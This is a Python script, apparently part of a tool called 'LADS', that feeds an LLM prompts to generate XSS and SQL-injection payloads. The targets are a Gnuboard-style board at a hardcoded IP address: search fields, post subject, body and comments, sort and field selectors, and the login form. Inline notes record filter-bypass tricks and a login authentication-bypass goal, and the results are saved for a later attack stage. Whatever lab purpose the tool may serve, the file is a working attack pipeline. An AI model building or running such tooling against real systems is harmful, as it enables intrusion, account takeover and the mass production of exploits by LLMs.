import json
import re
import argparse
import sys
import os
from urllib.parse import urlparse
from dotenv import load_dotenv

# LADS 루트의 env_example.env에서 API 키 로드
_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
load_dotenv(os.path.join(_ROOT, "env_example.env"))

# 직접 실행(python generate_payloads.py) 시 LADS 루트를 경로에 추가
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from .llm_client import LLMClient
    from .context_builder import SYSTEM_PROMPT, build_prompt
    from .parser import clean as parse_clean
except ImportError:
    from llm_client import LLMClient
    from context_builder import SYSTEM_PROMPT, build_prompt
    from parser import clean as parse_clean

from payload.filter import filter_payloads, deduplicate, report as filter_report

_BASE = os.getenv("TARGET_URL", "http://34.68.27.120:8081").rstrip("/")

# ---------------------------------------------------------------------------
# targets.json → INPUT_POINTS 동적 변환
# ---------------------------------------------------------------------------

# 파라미터 이름별 취약점 유형 힌트 집합
_SEARCH_PARAMS  = {"stx", "q", "query", "search", "keyword", "kw", "sw", "s"}
_SORT_PARAMS    = {"sst", "sod", "sort", "order", "orderby", "ob", "sort_col"}
_FIELD_PARAMS   = {"sfl", "field", "sf", "order_type", "search_field"}
_SUBJECT_PARAMS = {"wr_subject", "subject", "title", "post_title", "headline"}
_CONTENT_PARAMS = {"wr_content", "content", "body", "text", "message", "post_content", "description"}
_COMMENT_PARAMS = {"comment", "wr_comment", "reply", "memo"}
_LOGIN_PARAMS   = {"mb_id", "userid", "username", "user_id", "login_id", "email", "id"}


def _url_slug(url: str) -> str:
    """URL 경로 마지막 세그먼트를 짧은 슬러그로 변환. 예: /bbs/search.php → search"""
    path = urlparse(url).path
    basename = path.rstrip("/").split("/")[-1]
    name = re.sub(r"\.[a-z]+$", "", basename)            # 확장자 제거
    return re.sub(r"[^a-z0-9]", "_", name.lower())[:15] or "page"


def _infer_injections(param_name: str, method: str, url: str) -> list[tuple]:
    """
    파라미터 이름·메서드·URL에서 취약점 주입 후보를 추론한다.
    반환값: list of (point_prefix, vuln_types, inject_type, note)
    각 tuple → 하나의 INPUT_POINTS 엔트리가 된다.
    """
    n = param_name.lower()
    u = url.lower()
    result: list[tuple] = []

    # 검색 키워드 파라미터 → 반사형 XSS + SQLi string
    if n in _SEARCH_PARAMS or "search" in n or "query" in n or "keyword" in n:
        result.append((
            "xss_search", ["xss_search"], "reflected_xss",
            f"검색 파라미터 {param_name} - 반사형 XSS (value 속성 반영)",
        ))
        result.append((
            "sqli_string", ["sqli_string"], "string",
            f"검색 파라미터 {param_name} - SQLi (LIKE/INSTR 컨텍스트)",
        ))

    # 정렬 컬럼 → ORDER BY SQLi  (포인트명에 'sst' 포함 → baseline 자동 매핑)
    if n in _SORT_PARAMS:
        result.append((
            "sqli_sst", ["sqli_orderby"], "string",
            f"정렬 파라미터 {param_name} - ORDER BY SQLi (intval 없음)",
        ))

    # 필드 선택자 → SQLi field  (포인트명에 'sfl' 포함 → baseline 자동 매핑)
    if n in _FIELD_PARAMS:
        result.append((
            "sqli_sfl", ["sqli_field"], "string",
            f"필드 선택자 {param_name} - SQL WHERE 컬럼명 직접 삽입",
        ))

    # 제목/Subject → Stored XSS
    if n in _SUBJECT_PARAMS or "subject" in n or "title" in n:
        result.append((
            "xss_subject", ["xss_subject"], "stored_xss",
            f"제목 파라미터 {param_name} - Stored XSS (게시글 제목 반영)",
        ))

    # 본문/Content → Stored XSS
    if n in _CONTENT_PARAMS or "content" in n:
        result.append((
            "xss_content", ["xss_content"], "stored_xss",
            f"본문 파라미터 {param_name} - Stored XSS (HTML 허용 컨텍스트)",
        ))

    # 댓글 → Stored XSS
    if n in _COMMENT_PARAMS or "comment" in n:
        result.append((
            "xss_comment", ["xss_comment"], "stored_xss",
            f"댓글 파라미터 {param_name} - Stored XSS (URL 자동 링크 컨텍스트)",
        ))

    # 로그인 ID → SQLi 인증 우회  (포인트명에 'login' 포함 → baseline 자동 매핑)
    if n in _LOGIN_PARAMS or "login" in u or "login_check" in u:
        result.append((
            "sqli_login", ["sqli_login"], "string",
            f"로그인 파라미터 {param_name} - SQLi 인증 우회",
        ))

    # 아무 패턴도 안 걸리면 기본 추론
    if not result:
        if method.upper() == "POST":
            result.append((
                "xss_content", ["xss_content"], "stored_xss",
                f"POST 파라미터 {param_name} - Stored XSS 가능성",
            ))
        else:
            result.append((
                "xss_search", ["xss_search"], "reflected_xss",
                f"GET 파라미터 {param_name} - 반사형 XSS 가능성",
            ))
            result.append((
                "sqli_string", ["sqli_string"], "string",
                f"GET 파라미터 {param_name} - SQLi 가능성",
            ))

    return result


def build_input_points_from_targets(targets: list[dict]) -> list[dict]:
    """
    targets.json 목록을 INPUT_POINTS 형식으로 변환한다.
    - injectable 파라미터마다 취약점 유형별 엔트리 생성
    - 나머지 파라미터는 base_params로 활용
    - 동일 (url, param, prefix) 조합 중복 제거
    """
    points: list[dict] = []
    seen: set[tuple] = set()

    for target in targets:
        action = target.get("action", "")
        method = (target.get("method") or "GET").upper()
        params = target.get("params", [])
        if not action or not params:
            continue

        injectable  = [p for p in params if p.get("injectable")]
        all_default = {p["name"]: p.get("default_value", "") for p in params}
        slug        = _url_slug(action)

        for param in injectable:
            pname = param.get("name", "")
            if not pname:
                continue

            injections = _infer_injections(pname, method, action)
            for prefix, vuln_types, type_, note in injections:
                key = (action, pname, prefix)
                if key in seen:
                    continue
                seen.add(key)

                # 주입 대상 파라미터를 제외한 나머지가 base_params
                base_params = {k: v for k, v in all_default.items() if k != pname}

                points.append({
                    "name":        f"{prefix}_{slug}_{pname}",
                    "url":         action,
                    "method":      method,
                    "param":       pname,
                    "type":        type_,
                    "db":          "MySQL",
                    "note":        note,
                    "vuln_types":  vuln_types,
                    "base_params": base_params,
                })

    return points

INPUT_POINTS = [

    # XSS 타겟
    {
        "name":    "xss_wr_subject",
        "url":     _BASE + "/bbs/write_update.php",
        "method":  "POST",
        "param":   "wr_subject",
        "type":    "stored_xss",
        "note":    "게시글 제목 - 홈/상세/관리자 3곳 반영, script 차단",
        "vuln_types": ["xss_subject"],
        "base_params": {"w": "w", "bo_table": "free", "wr_content": "", "html": "1"},
    },
    {
        "name":    "xss_wr_content",
        "url":     _BASE + "/bbs/write_update.php",
        "method":  "POST",
        "param":   "wr_content",
        "type":    "stored_xss",
        "note":    "게시글 본문 - img/a/b/p 허용, script 차단, 이벤트핸들러 우회 필요",
        "vuln_types": ["xss_content"],
        "base_params": {"w": "w", "bo_table": "free", "wr_subject": "test", "html": "1"},
    },
    {
        "name":    "xss_search_stx",
        "url":     _BASE + "/bbs/search.php",
        "method":  "GET",
        "param":   "stx",
        "type":    "reflected_xss",
        "note":    "검색창 stx - value='' 속성 반영, onfocus=alert(1)→onfocusalert1 필터",
        "vuln_types": ["xss_search"],
        "base_params": {"sfl": "wr_subject", "sop": "and"},
    },
    {
        "name":    "xss_qalist_stx",
        "url":     _BASE + "/bbs/board.php",
        "method":  "GET",
        "param":   "stx",
        "type":    "reflected_xss",
        "note":    "Q&A 게시판 검색창 - board.php?bo_table=qa, search.php와 동일 stx 패턴",
        "vuln_types": ["xss_search"],
        "base_params": {"sfl": "wr_subject", "sop": "and"},
    },
    {
        "name":    "xss_comment",
        "url":     _BASE + "/bbs/write_comment_update.php",
        "method":  "POST",
        "param":   "wr_content",
        "type":    "stored_xss",
        "note":    "댓글 본문 - http:// URL만 <a href> 변환, javascript: 차단",
        "vuln_types": ["xss_comment"],
        "base_params": {"bo_table": "free", "wr_id": "1", "w": ""},
    },

    # SQLi 타겟
    {
        "name":    "sqli_search_sfl",
        "url":     _BASE + "/bbs/search.php",
        "method":  "GET",
        "param":   "sfl",
        "type":    "string",
        "db":      "MySQL",
        "note":    "검색 필드 선택자 - SQL WHERE {sfl} LIKE '...' 직접 연결",
        "vuln_types": ["sqli_field"],
        "base_params": {"stx": "test", "sop": "and"},
    },
    {
        "name":    "sqli_search_sst",
        "url":     _BASE + "/bbs/search.php",
        "method":  "GET",
        "param":   "sst",
        "type":    "string",
        "db":      "MySQL",
        "note":    "정렬 컬럼 - ORDER BY {sst} 직접 연결, intval 없음",
        "vuln_types": ["sqli_orderby"],
        "base_params": {"stx": "test", "sfl": "wr_subject", "sop": "and"},
    },
    {
        "name":    "sqli_search_stx",
        "url":     _BASE + "/bbs/search.php",
        "method":  "GET",
        "param":   "stx",
        "type":    "string",
        "db":      "MySQL",
        "note":    "검색 키워드 - INSTR(LOWER(col),LOWER(stx)) 컨텍스트, PHP 공백분리 → 페이로드 공백금지, a'))))...# 패턴",
        "vuln_types": ["sqli_string"],
        "base_params": {"sfl": "wr_subject", "sop": "and"},
    },
    {
        "name":    "sqli_login_mb_id",
        "url":     _BASE + "/bbs/login_check.php",
        "method":  "POST",
        "param":   "mb_id",
        "type":    "string",
        "db":      "MySQL",
        "note":    "로그인 아이디 - 문자열 컨텍스트, 인증 우회 목표",
        "vuln_types": ["sqli_login"],
        "base_params": {"mb_password": "test", "url": "/"},
    },
    {
        "name":    "sqli_qalist_sfl",
        "url":     _BASE + "/bbs/board.php",
        "method":  "GET",
        "param":   "sfl",
        "type":    "string",
        "db":      "MySQL",
        "note":    "Q&A 게시판 검색 필드 선택자 - board.php?bo_table=qa, search.php sfl과 동일 패턴",
        "vuln_types": ["sqli_field"],
        "base_params": {"stx": "test", "sop": "and"},
    },
]

COUNT = 7  # 타입당 페이로드 수


def run(
    out_file: str = "results/payloads_llm.json",
    targets_file: str | None = None,
    progress_callback=None,
):
    # ------------------------------------------------------------------
    # 1) INPUT_POINTS 결정: targets.json이 있으면 동적 생성, 없으면 하드코딩
    # ------------------------------------------------------------------
    active_points = INPUT_POINTS  # 기본 fallback

    if targets_file and os.path.exists(targets_file):
        try:
            with open(targets_file, encoding="utf-8") as _f:
                _targets = json.load(_f)
            if isinstance(_targets, list) and _targets:
                _dynamic = build_input_points_from_targets(_targets)
                if _dynamic:
                    active_points = _dynamic
                    print(f"[GENERATOR] targets.json 로드 완료: "
                          f"{len(_targets)} 타겟 → {len(_dynamic)} INPUT_POINTS 생성")
                else:
                    print("[GENERATOR] targets.json에서 유효 타겟 없음 → 하드코딩 INPUT_POINTS 사용")
            else:
                print("[GENERATOR] targets.json 비어 있음 → 하드코딩 INPUT_POINTS 사용")
        except Exception as _e:
            print(f"[GENERATOR] targets.json 로드 실패: {_e} → 하드코딩 INPUT_POINTS 사용")
    else:
        print("[GENERATOR] targets.json 없음 → 하드코딩 INPUT_POINTS 사용")

    # ------------------------------------------------------------------
    # 2) LLM 페이로드 생성
    # ------------------------------------------------------------------
    target_sample = active_points[0]["url"] if active_points else "N/A"
    print(f"\n{'='*60}")
    print(f"  Payload Generator v3  (points={len(active_points)})")
    print(f"  Sample URL: {target_sample}")
    print(f"{'='*60}\n")

    client = LLMClient()
    all_results = {}
    total_points = len(active_points)

    for idx, point in enumerate(active_points):
        pname = point["name"]
        if progress_callback:  # 로딩바 콜백 함수
            progress_callback(idx, total_points)
        print(f"\n[INPUT POINT] {pname}")
        print(f"  {point['method']} {point['url']} | param={point['param']}")
        print(f"  Note: {point['note']}")
        print("-" * 60)

        all_results[pname] = {}

        for vtype in point["vuln_types"]:
            print(f"  [{vtype}] generating...", end=" ", flush=True)
            try:
                prompt  = build_prompt(point, vtype, count=COUNT)
                raw     = client.generate(
                    prompt=prompt,
                    system=SYSTEM_PROMPT,
                    temperature=0.7,
                )
                parsed          = parse_clean(raw)           # 파싱 + 중복 제거
                filtered, rejected = filter_payloads(parsed) # 품질 필터링
                records         = deduplicate(filtered)       # 최종 중복 제거
                all_results[pname][vtype] = records
                print(f"{len(records)} payloads (제거: {len(rejected)}개)")
                for r in records:
                    print(f"    [{r['type']:20s}] {r['payload'][:70]}")
            except Exception as e:
                print(f"FAILED: {e}")
                all_results[pname][vtype] = []

        print()

    # 저장
    os.makedirs(os.path.dirname(out_file) or ".", exist_ok=True)
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(all_results, f, ensure_ascii=False, indent=2)

    # 메타 저장 (경로: env var, 내용: 상세 필드)
    # base_params도 포함 → strategy.py가 targets.json 없이도 base_params 활용 가능
    meta_file = os.getenv("PAYLOADS_META_FILE", "results/payloads_llm_meta.json")
    os.makedirs(os.path.dirname(meta_file) or ".", exist_ok=True)
    meta_list = [
        {
            "name":        point["name"],
            "url":         point["url"],
            "method":      point["method"],
            "param":       point["param"],
            "type":        point.get("type", ""),
            "note":        point.get("note", ""),
            "vuln_types":  point.get("vuln_types", []),
            "base_params": point.get("base_params", {}),
        }
        for point in active_points
    ]
    with open(meta_file, "w", encoding="utf-8") as f:
        json.dump(meta_list, f, ensure_ascii=False, indent=2)

    all_records = [
        r
        for point_data in all_results.values()
        for records in point_data.values()
        for r in records
    ]
    total = len(all_records)

    print(f"{'='*60}")
    print(f"  저장 완료  -> {out_file}")
    print(f"  메타 저장  -> {meta_file}")
    print(f"  INPUT_POINTS: {len(active_points)} ({'동적(targets.json)' if active_points is not INPUT_POINTS else '하드코딩'})")
    print(f"  총 페이로드: {total}")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--out", default="results/payloads_llm.json")
    args = parser.parse_args()
    run(args.out)
